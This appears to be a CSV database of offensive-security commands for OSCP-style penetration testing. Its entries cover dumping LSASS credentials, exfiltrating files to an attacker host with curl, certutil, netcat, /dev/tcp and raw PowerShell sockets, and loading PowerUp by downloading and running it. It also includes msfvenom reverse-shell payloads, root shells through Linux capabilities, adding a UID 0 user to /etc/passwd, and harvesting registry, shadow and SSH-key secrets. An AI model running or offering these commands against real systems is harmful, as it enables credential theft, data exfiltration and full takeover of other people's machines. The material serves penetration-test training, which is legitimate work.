"pypykatz-parse","Parse LSASS Dump with pypykatz","post-exploit","pypykatz lsa minidump <DUMP_FILE>","Parse LSASS memory dump offline to extract credentials.
Extract NTLM hashes, Kerberos tickets, and plaintext passwords.
Pure Python alternative to Mimikatz.","","Pure Python LSASS parser - runs on Linux (Kali).

Advantages over Mimikatz:
(1) Offline parsing (no risk on target), (2) Runs on Linux (no Windows needed), (3) Supports multiple output formats (text, JSON, Kerberos ticket extraction).

Credentials extracted:
(1) NTLM hashes (always present for logged-on users), (2) Plaintext passwords (only if WDigest enabled - disabled by default on Win10+/2016+), (3) Kerberos tickets (TGT/TGS for active sessions), (4) Cached domain credentials.

OSCP workflow:
(1) Dump LSASS on target (procdump/comsvcs), (2) Transfer dump to Kali, (3) Parse with pypykatz, (4) Extract hashes, (5) Pass-the-hash or crack offline.

Modern Windows protection:
Credential Guard (encrypts LSASS memory) prevents credential extraction - pypykatz will show encrypted blobs instead of cleartext.","high"
"comsvcs-lsass-dump","Dump LSASS with comsvcs.dll","post-exploit","rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> <OUTPUT_FILE> full","Create LSASS memory dump using built-in Windows comsvcs.dll.
No external tools required - native LOLBin technique.","","Living-off-the-land (LOLBin) technique using native Windows DLL.

Advantages:
(1) No external tools needed (comsvcs.dll always present), (2) Signed Microsoft binary (less suspicious), (3) Works identically to procdump.

Get LSASS PID:
PowerShell:
(Get-Process lsass).Id OR cmd:
tasklist /fi ""imagename eq lsass.exe"".

comsvcs.dll's MiniDump function is legitimate crash dump API - used by Windows Error Reporting.

Attackers abuse it for LSASS dumping.

Modern detection:
EDR monitors comsvcs.dll calls to lsass.exe PID.

OSCP:
Preferred when procdump unavailable or blocked - native Windows technique, no upload required.

One-liner with PID resolution:
PowerShell:
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full","high"
"ps-get-process-owner","Get Process Owner (PowerShell)","enumeration","Get-WmiObject -Class Win32_Process -Filter ""name='<PROCESS_NAME>'"" | Select-Object Name, ProcessId, @{Name='Owner';Expression={$_.GetOwner().User}}","Identify which user account owns running processes.
Useful for finding service account processes to inject into.","","Identify which user account runs specific processes.

Use case:
You compromised 'sqlservice' account and want to find where it's actively running (not just sessions).

If you find sqlservr.exe (SQL Server) running as sqlservice, you can:
(1) Inject into that process (becomes sqlservice context), (2) Access resources as sqlservice (files, registry, network).

Alternative:
tasklist /v shows owner but requires admin.

This WMI method also requires admin but provides programmatic access.

OSCP:
Use after compromising service account - find where it runs, target those processes for code execution.","medium"
"file-transfer-python-http","Python HTTP Server (Download from Target)","post-exploit","python3 -m http.server <PORT>","Start HTTP server on attacker machine for file downloads","exfiltration","Run in directory containing files to transfer","high"
"file-transfer-wget","Linux: wget Download","post-exploit","wget http://<LHOST>:<PORT>/<FILE> -O <OUTPUT>","Download file using wget on Linux target","exfiltration","Add --no-check-certificate for HTTPS without valid cert","high"
"file-transfer-curl","Linux: curl Download","post-exploit","curl http://<LHOST>:<PORT>/<FILE> -o <OUTPUT>","Download file using curl on Linux target","exfiltration","curl -L follows redirects, useful for shortened URLs","high"
"file-transfer-certutil","Windows: certutil Download","post-exploit","certutil -urlcache -f http://<LHOST>:<PORT>/<FILE> <OUTPUT>","Download file using certutil (Windows native tool)","exfiltration","Native Windows tool, often bypasses basic restrictions","high"
"file-transfer-powershell-download","Windows: PowerShell Download File","post-exploit","powershell -c ""(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>:<PORT>/<FILE>', '<OUTPUT>')""","Download file using PowerShell WebClient","exfiltration","Add -ep bypass if execution policy blocks:
powershell -ep bypass -c ""...""","high"
"file-transfer-scp","Linux: SCP Transfer","post-exploit","scp <FILE> <USER>@<TARGET>:<DEST>","Securely copy file to target via SSH","exfiltration","Requires SSH access to target","medium"
"file-transfer-smb","Windows: SMB Transfer","post-exploit","copy \\<LHOST>\<SHARE>\<FILE> <DEST>","Copy file from SMB share on attacker machine","exfiltration","Setup SMB server:
impacket-smbserver share $(pwd) -smb2support -username user -password pass","high"
"file-transfer-nc-push","Netcat: Push File to Target","post-exploit","nc -lvnp <PORT> < <FILE>","Push file to target using netcat (target connects)","exfiltration","Target command: nc <LHOST> <PORT> > output_file","high"
"file-transfer-nc-pull","Netcat: Pull File from Target","post-exploit","nc -lvnp <PORT> > <FILE>","Receive file from target using netcat","exfiltration","Target sends with:
nc <LHOST> <PORT> < file_to_send","medium"
"file-transfer-base64","Base64 Encode/Decode Transfer","post-exploit","base64 <FILE> | nc <TARGET> <PORT>","Transfer file encoded as base64 (safe for text channels)","exfiltration","Windows decode:
certutil -decode input.b64 output.exe","medium"
"file-transfer-php","PHP Upload Script","post-exploit","echo '<?php file_put_contents($_FILES[""file""][""name""], file_get_contents($_FILES[""file""][""tmp_name""])); ?>' > upload.php","Create simple PHP upload handler on target web server","exfiltration","Place in web-accessible directory, use curl -F to upload","medium"
"file-transfer-ftp","FTP Transfer","post-exploit","ftp <TARGET>","Transfer files via FTP (if FTP server available)","exfiltration","Setup FTP server: python -m pyftpdlib -p 21 -w","low"
"file-transfer-bitsadmin","Windows: bitsadmin Download","post-exploit","bitsadmin /transfer job /download /priority high http://<LHOST>:<PORT>/<FILE> <OUTPUT>","Download file using Windows BITS service","exfiltration","BITS runs in background, can be slower than certutil","medium"
"file-transfer-dev-tcp","Linux: /dev/tcp Download","post-exploit","cat < /dev/tcp/<LHOST>/<PORT> > <OUTPUT>","Download file using bash /dev/tcp (no external tools needed)","exfiltration","Works when wget/curl unavailable; requires bash with /dev/tcp enabled","medium"
"exfil-uploadserver","Python Upload Server (Kali)","post-exploit","python3 -m uploadserver <PORT>","Start HTTP server that accepts file uploads from target","exfiltration","Install with:
pip3 install uploadserver; supports POST uploads","high"
"exfil-powershell-upload","Windows: PowerShell Upload File","post-exploit","powershell -c ""Invoke-RestMethod -Uri http://<LHOST>:<PORT>/upload -Method Post -InFile '<FILE>'""","Upload file from Windows target to attacker's uploadserver","exfiltration","Add -ep bypass if execution policy blocks:
powershell -ep bypass -c ""...""","high"
"exfil-smb-upload","Windows: Upload via SMB Share","post-exploit","copy ""<FILE>"" \\<LHOST>\<SHARE>\","Upload file from Windows target to Kali SMB share","exfiltration","Fastest method for large files; requires port 445 open","high"
"exfil-nc-tcp-upload","PowerShell: TCP Upload via Socket","post-exploit","$client = New-Object System.Net.Sockets.TcpClient('<LHOST>',<PORT>); $stream = $client.GetStream(); $data = [IO.File]::ReadAllBytes('<FILE>'); $stream.Write($data, 0, $data.Length); $stream.Close(); $client.Close()","Upload file using raw TCP socket (works when HTTP/SMB blocked)","exfiltration","Loads entire file to memory; not suitable for files >1GB","high"
"exfil-powershell-base64","PowerShell: Base64 Encode File","post-exploit","[Convert]::ToBase64String([IO.File]::ReadAllBytes('<FILE>'))","Encode file to base64 for copy/paste exfiltration","exfiltration","Only practical for files <1MB; output is ~33% larger than original","medium"
"exfil-curl-upload","Linux: Curl Upload File","post-exploit","curl -X POST -F file=@<FILE> http://<LHOST>:<PORT>/upload","Upload file from Linux target to uploadserver","exfiltration","Requires uploadserver or similar HTTP upload handler","high"
"ps-registry-autologon","PowerShell Registry AutoLogon Credential Extraction","POST_EXPLOIT","Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object DefaultUserName,DefaultPassword,DefaultDomainName","One-liner commands to extract cleartext credentials from Windows Registry AutoLogon keys","CREDENTIAL_HARVESTING","",""
"enumerate-capabilities","Enumerate Linux File Capabilities","post-exploit","getcap -r / 2>/dev/null","Recursively enumerate all binaries with Linux file capabilities set. Capabilities are kernel features that grant specific elevated permissions without requiring full SUID root. This discovers potential privilege escalation vectors by locating binaries with dangerous capabilities like cap_setuid or cap_dac_override.","privilege-escalation","Capabilities notation:
+ep means Effective and Permitted (capability is active).

=eip means Effective, Inheritable, and Permitted (full capability inheritance).

Comma-separated capabilities possible:
cap_net_admin,cap_net_raw+ep.

Network capabilities (cap_net_raw, cap_net_admin) are non-exploitable for privesc.

Empty output is normal on hardened systems without capability-based binaries.

Faster than full SUID enumeration as fewer binaries typically have capabilities.","High - Modern alternative to SUID often missed in basic enumeration. Critical for complete privilege escalation coverage on Linux targets with capabilities-enabled binaries."
"filter-exploitable-caps","Filter Exploitable Capabilities","post-exploit","# Manual analysis - filter getcap output for dangerous capabilities
# CRITICAL: cap_setuid, cap_dac_override, cap_sys_admin, cap_sys_ptrace
# HIGH: cap_dac_read_search, cap_setgid, cap_chown, cap_fowner
# NON-EXPLOITABLE: cap_net_raw, cap_net_admin (network only)","Analyze getcap enumeration output to identify dangerous capabilities that enable privilege escalation. Focus on critical capabilities: cap_setuid (spawn root shell), cap_dac_override (bypass file permissions for write), cap_dac_read_search (bypass read permissions), cap_sys_admin (mount filesystems), cap_sys_ptrace (inject code). Ignore network-only capabilities.","privilege-escalation","CRITICAL CAPABILITIES - Direct root access:

cap_setuid:
Change process UID to 0 (root shell).

cap_dac_override:
Bypass all file permission checks (write any file).

cap_sys_admin:
Full system administration (mount, namespace manipulation).

cap_sys_ptrace:
Trace any process (inject shellcode into root process).

HIGH SEVERITY CAPABILITIES - Sensitive data access:

cap_dac_read_search:
Bypass read permission checks (shadow, SSH keys).

cap_setgid:
Change GID to root group.

cap_chown:
Change file ownership (chown /etc/passwd to gain write).

cap_fowner:
Bypass permission checks for file operations.

NON-EXPLOITABLE FOR PRIVESC:

cap_net_raw, cap_net_admin:
Network packet manipulation only.

cap_net_bind_service:
Bind to privileged ports <1024.","High - Correctly identifying exploitable capabilities vs. noise is critical. Many systems have network capabilities (non-exploitable) that can waste time if not filtered."
"gtfobins-cap-lookup","GTFOBins Capabilities Lookup","post-exploit","# Manual lookup process:
# 1. Visit https://gtfobins.github.io/
# 2. Use filter: Click 'Capabilities' checkbox
# 3. Search for binary name (python, vim, tar, etc.)
# 4. Note exact command syntax with capability requirements
# Alternative: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities","Research documented exploitation techniques for identified capability/binary combinations using GTFOBins or HackTricks. GTFOBins provides exact command syntax for exploiting capabilities on common Unix binaries. Each capability type requires different exploitation approach based on what privileged operation it enables.","privilege-escalation","COMMON GTFOBINS CAPABILITY EXPLOITS:

cap_setuid exploitation:

- python/perl/ruby:
Use setuid(0) syscall then spawn shell.

- php:
posix_setuid(0) then system('/bin/bash').

- node:
process.setuid(0) then require('child_process').spawn('/bin/bash').

cap_dac_override exploitation:

- vim/nano:
Open /etc/passwd, add user with UID 0.

- tar:
Create archive with modified /etc/passwd, extract to overwrite.

- cp:
Copy /etc/passwd to /tmp, modify, copy back.

cap_dac_read_search exploitation:

- tar:
Archive sensitive files (shadow, SSH keys) for exfiltration.

- base64:
Encode and exfiltrate /etc/shadow or root SSH keys.

- od/xxd:
Dump binary files like /etc/shadow.

cap_sys_ptrace exploitation:

- gdb:
Attach to root process, inject shellcode.

- strace:
Trace root process, potentially inject.

cap_sys_admin exploitation:

- mount:
Mount privileged filesystem or overlay /etc.

GTFOBins capabilities filter is most reliable source for exact syntax.","Critical - GTFOBins is essential reference for OSCP. Capabilities section less commonly known but highly effective when encountered. Memorize common patterns for interpreters (setuid) and editors (dac_override)."
"execute-cap-exploit","Execute Capability Exploitation","post-exploit","# Command depends on capability type and binary:
# TEMPLATE: <CAP_BINARY> [capability-specific-arguments]
# See specific commands below for each capability type","Execute capability exploitation using documented GTFOBins technique. Each capability/binary combination requires different command syntax. This is the actual privilege escalation step where the capability is abused to perform privileged operations like spawning root shell, editing sensitive files, or reading protected data.","privilege-escalation","SPECIFIC EXPLOITATION COMMANDS BY CAPABILITY:

cap_setuid + python/python3:
/usr/bin/python3 -c 'import os;
os.setuid(0);
os.system(""/bin/bash"")'
Result:
Spawns root shell immediately.

cap_setuid + perl:
/usr/bin/perl -e 'use POSIX qw(setuid);
POSIX::setuid(0);
exec ""/bin/bash"";'
Result:
Spawns root shell.

cap_setuid + ruby:
/usr/bin/ruby -e 'Process::Sys.setuid(0);
exec ""/bin/bash""'
Result:
Spawns root shell.

cap_setuid + node:
/usr/bin/node -e 'process.setuid(0);
require(""child_process"").spawn(""/bin/bash"", {stdio:
[0, 1, 2]});'
Result:
Spawns root shell.

cap_setuid + php:
/usr/bin/php -r ""posix_setuid(0);
system('/bin/bash');""
Result:
Spawns root shell.

cap_dac_override + vim:
/usr/bin/vim.basic /etc/passwd
Then:
Add line:
hacker:x:0:0::/root:/bin/bash
Then:
su hacker (no password)
Result:
Root access via UID 0 user.

cap_dac_override + nano:
/usr/bin/nano /etc/passwd
Same as vim - add UID 0 user.

cap_dac_read_search + tar:
/usr/bin/tar -czf /tmp/shadow.tar.gz /etc/shadow
/usr/bin/tar -czf /tmp/ssh.tar.gz /root/.ssh/id_rsa
Result:
Sensitive files archived for exfiltration.

cap_dac_read_search + base64:
/usr/bin/base64 /etc/shadow | base64 -d
/usr/bin/base64 /root/.ssh/id_rsa
Result:
File contents exfiltrated.

cap_sys_ptrace + gdb:
Find root process:
ps aux | grep root
/usr/bin/gdb -p <root_pid>
Then:
call (void)system(""cp /bin/bash /tmp/rootbash;
chmod +xs /tmp/rootbash"")
Result:
SUID root shell created.

cap_sys_admin + mount:
Advanced - mount privileged filesystem or overlay /etc
Requires deep understanding of mount namespaces.","Critical - This is the actual exploitation step. Must be executed correctly with exact syntax. Practice common patterns (python setuid, vim dac_override) as these appear frequently in OSCP-like environments."
"verify-cap-access","Verify Elevated Access from Capability Exploitation","post-exploit","whoami && id && cat /etc/shadow 2>/dev/null | head -n 3","Verify successful privilege escalation after capability exploitation. Test multiple indicators: effective UID via whoami, full UID/GID/groups via id, ability to read root-protected files like /etc/shadow. This confirms level of access achieved and whether full root or partial privilege escalation succeeded.","privilege-escalation","Different capabilities grant different levels of access:

cap_setuid:
Full root shell (uid=0, all access).

cap_dac_override:
Full root file access (read+write any file).

cap_dac_read_search:
Read-only root file access (shadow, SSH keys).

cap_sys_ptrace:
Indirect root via process injection.

If shadow file readable, priority actions:

1.
Copy full shadow file for offline password cracking.

2.
Extract root user hash:
cat /etc/shadow | grep '^root:'

3.
Use john or hashcat to crack:
john --wordlist=rockyou.txt shadow.txt

4.
Look for users with empty password fields (:::: format).

If root SSH key accessible:

1.
Copy /root/.ssh/id_rsa to attacker machine.

2.
Set correct permissions:
chmod 600 id_rsa.

3.
SSH as root:
ssh -i id_rsa root@target.

For OSCP:
Screenshot evidence of uid=0 and shadow/flag file access.","Critical - Must verify root access for proof. Take screenshots showing uid=0 and flag file contents. Shadow file access proves privileged read, which can lead to password cracking for persistent access."
"cap-exploit-dac-override-passwd-edit","Exploit cap_dac_override by Editing /etc/passwd","post-exploit","<CAP_BINARY> /etc/passwd","Exploit cap_dac_override capability to bypass file permissions and edit /etc/passwd. Add a new user with UID 0 (root) and no password, then switch to that user for root access. This technique works with text editors (vim, nano) that have cap_dac_override set. Alternative to spawning root shell directly.","privilege-escalation","/etc/passwd line format:
username:x:UID:GID:GECOS:homedir:shell

For instant root:
hacker:x:0:0::/root:/bin/bash

username:
hacker (or any name).

x:
placeholder (actual password in /etc/shadow).

UID:
0 (root user ID - critical).

GID:
0 (root group ID).

GECOS:
empty (full name field).

homedir:
/root (root's home).

shell:
/bin/bash (login shell).

After adding line, use:
su hacker (no password required).

Alternative:
Remove root password entirely:

Change:
root:x:0:0:root:/root:/bin/bash

To:
root::0:0:root:/root:/bin/bash

Then:
su root (no password).

cap_dac_override bypasses Discretionary Access Control (DAC).

DAC = traditional Unix file permissions (owner, group, other).

Does NOT bypass Mandatory Access Control (MAC) like SELinux/AppArmor.

Editors other than vim/nano may work:
emacs, ed, sed with -i flag.

More stealthy than spawning root shell (less obvious in process list).","High - Alternative technique when cap_setuid not available. Commonly tested on OSCP boxes with vim or nano having cap_dac_override. Must know /etc/passwd format and UID 0 concept."
"win-privesc-winpeas","WinPEAS - Automated Enumeration","post-exploit","winPEASany.exe","Comprehensive automated privilege escalation enumeration for Windows","windows","Transfer via certutil, PowerShell download, or SMB share","high"
"win-privesc-powerup","PowerUp - PowerShell Enumeration","post-exploit","powershell -ep bypass -c ""IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1'); Invoke-AllChecks""","PowerShell-based privilege escalation scanner","windows","Part of PowerSploit framework - download from GitHub","high"
"win-systeminfo","System Information Gathering","post-exploit","systeminfo && hostname && whoami /all","Gather basic system information for privilege escalation planning","windows","SeImpersonate/SeAssignPrimaryToken = Potato exploit candidates","high"
"win-unquoted-service-paths","Find Unquoted Service Paths","post-exploit","wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v ""C:\Windows\\"" | findstr /i /v """"""""","Find services with unquoted paths containing spaces (exploitable)","windows","Example:
C:\Program Files\My Service\service.exe tries C:\Program.exe first","high"
"win-weak-service-perms","Check Service Permissions","post-exploit","accesschk.exe -uwcqv ""Authenticated Users"" * /accepteula","Find services with weak permissions (modifiable by current user)","windows","Download accesschk from Sysinternals or use PowerShell alternatives","high"
"win-always-install-elevated","Check AlwaysInstallElevated","post-exploit","reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated && reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated","Check if AlwaysInstallElevated is enabled (allows MSI as SYSTEM)","windows","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > payload.msi","high"
"win-registry-autologon","Search Registry for Passwords","post-exploit","reg query HKLM /f password /t REG_SZ /s && reg query HKCU /f password /t REG_SZ /s","Search registry for stored passwords (autologon, VNC, etc.)","windows","Check specifically:
Winlogon, VNC, Putty, SNMP keys","medium"
"win-scheduled-tasks","Enumerate Scheduled Tasks","post-exploit","schtasks /query /fo LIST /v && dir C:\windows\system32\tasks","List scheduled tasks that may be exploitable","windows","Pay attention to tasks with SYSTEM privileges and writable paths","medium"
"win-dll-hijacking","DLL Hijacking Opportunities","post-exploit","dir /s /b C:\*.dll 2>nul | findstr /v ""C:\Windows"" && echo Check PATH directories","Find potential DLL hijacking opportunities","windows","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> -f dll > evil.dll","medium"
"win-potato-exploits","Check for Potato Exploit Eligibility","post-exploit","whoami /priv | findstr /i ""SeImpersonate SeAssignPrimaryToken""","Check for privileges needed for Potato-family exploits","windows","IIS, SQL Server service accounts commonly have these privileges","high"
"win-kernel-exploits","Check for Kernel Exploits","post-exploit","systeminfo > systeminfo.txt && python3 windows-exploit-suggester.py --database <DATE>-mssb.xls --systeminfo systeminfo.txt","Identify missing patches and applicable kernel exploits","windows","Update database:
python windows-exploit-suggester.py --update","medium"
"win-saved-credentials","Check Saved Credentials","post-exploit","cmdkey /list && dir C:\Users\*\AppData\Local\Microsoft\Credentials\* && dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\*","Find saved Windows credentials that can be reused","windows","runas /savecred /user:DOMAIN\Admin ""cmd.exe"" if admin creds cached","medium"
"win-password-files","Search for Password Files","post-exploit","dir /s /b C:\*password* C:\*cred* C:\*vnc* C:\*.config 2>nul | findstr /v ""[System32 SysWOW64]""","Search filesystem for files potentially containing passwords","windows","Also check: unattend.xml, sysprep.inf, web.config","medium"
"win-sam-system-backup","Check for SAM/SYSTEM Backups","post-exploit","dir /s /b C:\SAM C:\SYSTEM 2>nul && reg save HKLM\SAM sam.hiv && reg save HKLM\SYSTEM system.hiv","Find or create SAM/SYSTEM backups for offline password cracking","windows","secretsdump.py -sam sam.hiv -system system.hiv LOCAL","high"
"win-group-membership","Check Privileged Group Membership","post-exploit","net user <USERNAME> && net localgroup administrators && whoami /groups","Check user's group memberships for privilege escalation opportunities","windows","Backup Operators can read any file, Server Operators can modify services","high"
"windows-whoami-privs","Check Current Privileges","post-exploit","whoami /priv","List current user privileges on Windows","windows","SeImpersonatePrivilege = instant win on older Windows","high"
"windows-systeminfo","System Information Gathering","post-exploit","systeminfo | findstr /B /C:""OS Name"" /C:""OS Version"" /C:""System Type""","Get Windows version for exploit research","windows","Save full output for Windows Exploit Suggester","high"
"windows-unquoted-service","Find Unquoted Service Paths","post-exploit","wmic service get name,displayname,pathname,startmode | findstr /i ""auto"" | findstr /i /v ""C:\Windows\\"" | findstr /i /v ""\""""","Find services with unquoted paths for privilege escalation","windows","Requires write access to parent directory","high"
"windows-alwaysinstallelevated","Check AlwaysInstallElevated","post-exploit","reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated & reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated","Check if MSI files install with SYSTEM privileges","windows","Both keys must be set for exploitation","high"
"windows-scheduled-tasks","Enumerate Scheduled Tasks","post-exploit","schtasks /query /fo LIST /v | findstr /C:""Task To Run"" /C:""Run As User""","Find scheduled tasks running as SYSTEM","windows","Focus on tasks with writable binaries/scripts","high"
"windows-service-permissions","Check Service Permissions","post-exploit","accesschk.exe -uwcqv ""Authenticated Users"" * /accepteula","Find services with weak permissions","windows","Download accesschk from Sysinternals","high"
"windows-potato-attacks","Potato Attacks (JuicyPotato)","post-exploit","JuicyPotato.exe -l 1337 -p C:\windows\system32\cmd.exe -t * -c {CLSID}","Exploit SeImpersonatePrivilege for SYSTEM shell","windows","Works up to Windows Server 2016/Windows 10 1809

Alternative Techniques:
- sweetpotato.exe","high"
"windows-sam-system-backup","SAM/SYSTEM Backup Files","post-exploit","dir /s /b C:\Windows\repair\SAM C:\Windows\System32\config\RegBack\SAM","Find backup SAM/SYSTEM files for hash extraction","windows","Requires backup files or SeBackupPrivilege","high"
"windows-stored-credentials","Search for Stored Credentials","post-exploit","cmdkey /list","List stored credentials in Windows Credential Manager","windows","RunAs with /savecred is powerful","high"
"windows-dpapi-masterkeys","DPAPI Master Keys","post-exploit","dir /a /s /b C:\Users\*\AppData\Roaming\Microsoft\Protect\","Find DPAPI master keys for credential decryption","windows","Requires user password or domain backup key","medium"
"windows-autologon","AutoLogon Credentials","post-exploit","reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" | findstr /i ""DefaultUserName DefaultDomainName DefaultPassword""","Check registry for autologon credentials","windows","Common in kiosk/lab environments

Alternative Techniques:
- netpass.exe","high"
"windows-pass-the-hash","Pass the Hash Attack","post-exploit","mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""","Extract NTLM hashes for pass-the-hash attacks","windows","Requires local admin or SYSTEM","high"
"windows-kerberoasting","Kerberoasting Attack","post-exploit","setspn -T <DOMAIN> -Q */* | findstr /i service","Find service accounts for Kerberoasting","windows","Service account passwords often weak","high"
"windows-dll-hijacking","DLL Hijacking Check","post-exploit","echo %PATH% & where /r C:\ *.dll 2>nul | findstr /i /c:""program files""","Find potential DLL hijacking opportunities","windows","Common with third-party applications","medium"
"get-aduser","Get Active Directory User","enumeration","Get-ADUser -Identity <USERNAME> -Properties *","Query Active Directory user account using native AD PowerShell module. Returns comprehensive user properties including group memberships, account settings, and attributes. Requires Active Directory PowerShell module to be installed.","","Native alternative to PowerView's Get-NetUser.

Requires AD PowerShell module (part of RSAT).

For all users:
Get-ADUser -Filter * -Properties *.

For service accounts:
Get-ADUser -Filter {ServicePrincipalName -like '*'} -Properties ServicePrincipalNames.

Manual alternative:
net user <username> /domain","high"
"get-adgroup","Get Active Directory Group","enumeration","Get-ADGroup -Identity ""<GROUPNAME>"" -Properties *","Query Active Directory group information using native AD PowerShell module. Returns group properties, members, and group scope. Critical for identifying privileged groups and their memberships.","","OSCP Priority Groups:
'Domain Admins', 'Enterprise Admins', 'Backup Operators', 'Account Operators', 'Server Operators'.

Native alternative to PowerView's Get-NetGroup.

For all groups:
Get-ADGroup -Filter * -Properties *.

Manual alternative:
net group ""<group>"" /domain","high"
"get-adgroupmember","Get Active Directory Group Members","enumeration","Get-ADGroupMember -Identity ""<GROUPNAME>"" -Recursive","Retrieve members of an Active Directory group including nested group memberships. The -Recursive flag expands nested groups to show all effective members. Critical for mapping privilege escalation paths.","","Native alternative to PowerView's Get-NetGroupMember.

Always use -Recursive to find nested memberships (users in Group A which is member of Group B).

Critical for OSCP AD enumeration.

Manual alternative:
net group ""<group>"" /domain (shows direct members only)","high"
"get-adcomputer","Get Active Directory Computer","enumeration","Get-ADComputer -Filter * -Properties *","Query Active Directory computer objects including workstations, servers, and domain controllers. Returns detailed system information for lateral movement targeting.","","Native alternative to PowerView's Get-NetComputer.

Focus on servers for OSCP:
Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties *.

For domain controllers:
Get-ADDomainController -Filter *.

Manual alternative:
net view for basic computer list","high"
"get-ciminstance","Get CIM Instance","enumeration","Get-CimInstance -ClassName <CLASSNAME>","Query Windows Management Instrumentation (WMI) classes using CIM cmdlets. Modern replacement for Get-WmiObject. Retrieves system information including processes, services, hardware, installed software, and configuration.","","OSCP Key Classes:
Win32_Process (processes), Win32_Service (services), Win32_OperatingSystem (system info), Win32_StartupCommand (persistence).

Avoid Win32_Product (triggers consistency check).

Modern replacement for Get-WmiObject (deprecated).

For remote queries:
Get-CimInstance -ClassName Win32_Process -ComputerName <TARGET>","high"
"get-computerinfo","Get Computer Information","enumeration","Get-ComputerInfo","Retrieve comprehensive system information including OS details, hardware configuration, domain membership, and installed hotfixes. PowerShell 5.1+ cmdlet that consolidates multiple system queries into single output.","","OSCP Quick Enum:
Fast one-liner for system overview.

Check OsVersion for patch level (compare against exploit-db), CsDomain for AD environment, OsArchitecture for payload architecture.

Output is verbose - filter with -Property or Select-Object.

Faster alternatives:
systeminfo or Get-CimInstance Win32_OperatingSystem","medium"
"get-itemproperty","Get Registry Item Property","enumeration","Get-ItemProperty -Path <REGISTRY_PATH>","Read Windows Registry values from specified registry key path. Critical for discovering credentials, configuration settings, installed software, and privilege escalation vectors stored in registry.","","OSCP Critical Paths:
AlwaysInstallElevated (HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer - check AlwaysInstallElevated=1), Winlogon credentials (HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon - DefaultUserName/DefaultPassword), Service paths (HKLM:\System\CurrentControlSet\Services\<service> - ImagePath for unquoted paths).

Manual alternative:
reg query <path> /v <value>","high"
"get-acl","Get Access Control List","enumeration","Get-Acl -Path <PATH>","Retrieve Access Control List (ACL) for file system objects, registry keys, or Active Directory objects. Shows permissions (DACL), ownership, and access rights. Critical for identifying privilege escalation via weak permissions.","","OSCP PrivEsc:
Look for services with writable binary paths, Program Files directories with Modify/Write for Users, registry keys with Full Control for non-admins.

Key permissions:
FullControl (full access), Modify (write/delete), Write (create/modify).

Check current user's effective permissions:
(Get-Acl <PATH>).Access | Where-Object {$_.IdentityReference -like '*Users*'}.

Manual alternative:
icacls <path>","high"
"get-scheduledtask","Get Scheduled Tasks","enumeration","Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'}","Enumerate Windows scheduled tasks including task names, states, triggers, actions, and principals. Critical for identifying privilege escalation via task hijacking and persistence mechanisms.","","OSCP PrivEsc:
Find tasks running as SYSTEM/admin with writable binaries.

Check Actions property for executable paths, verify permissions with Get-Acl.

Common vectors:
Tasks in C:\Users\<user>\AppData, tasks with environment variable paths (%TEMP%), tasks with relative paths.

Get task details:
Get-ScheduledTask -TaskName <name> | Select-Object -ExpandProperty Actions.

Manual alternative:
schtasks /query /fo LIST /v","high"
"get-gpppassword","Get Group Policy Preferences Password","exploitation","Get-GPPPassword","Extract and decrypt passwords from Group Policy Preferences (GPP) XML files stored in SYSVOL. GPP allows setting local admin passwords via Group Policy, but stores them with known AES key. This PowerSploit/PowerUp function finds and decrypts these passwords automatically.","","OSCP Critical:
GPP vulnerability (MS14-025 patched but files remain).

Searches \\<domain>\SYSVOL\<domain>\Policies for Groups.xml containing cpassword attribute.

AES key is publicly known (same for all domains).

Manual alternative:
Search SYSVOL for cpassword, decrypt with gpp-decrypt or Python script.

Modern domains may not use GPP passwords, but legacy configs remain.

Works from any domain user context.","high"
"get-unquotedservice","Get Unquoted Service Paths","enumeration","Get-ServiceUnquoted","Identify Windows services with unquoted executable paths containing spaces. PowerUp function that finds services vulnerable to path hijacking privilege escalation. When service path is unquoted with spaces, Windows attempts to execute from multiple locations, allowing DLL/binary hijacking.","","OSCP PrivEsc Gold:
Unquoted service paths are common Windows privilege escalation vector.

Example:
Path 'C:\Program Files\Vulnerable App\service.exe' without quotes tries 'C:\Program.exe', 'C:\Program Files\Vulnerable.exe' before correct path.

Place malicious binary in intermediate path with write access.

Requires service restart (manual or automatic).

Check writable directories:
icacls 'C:\Program Files'.

PowerUp's Invoke-AllChecks includes this check.

Manual alternative:
wmic service get name,pathname | findstr /i /v ""C:\Windows"" | findstr /i /v ""\""""","high"
"get-modifiableservicefile","Get Modifiable Service Binaries","enumeration","Get-ModifiableServiceFile","Identify Windows services with binaries or configuration files that current user can modify. PowerUp function that checks file permissions on service executables, DLLs, and config files. Direct privilege escalation by replacing service binary with malicious executable.","","OSCP PrivEsc Critical:
Service binary hijacking is reliable privilege escalation.

If service runs as SYSTEM and current user can overwrite binary, replace with reverse shell or local admin creation payload.

Always backup original binary first.

Check if service auto-starts or requires manual restart.

PowerUp's Install-ServiceBinary automates exploitation.

Verify permissions:
icacls <path> | findstr /i ""Users Everyone Authenticated"".

Manual alternative:
for /f %i in ('sc query state^= all^| findstr SERVICE_NAME') do @echo %i && icacls ""%i""","high"
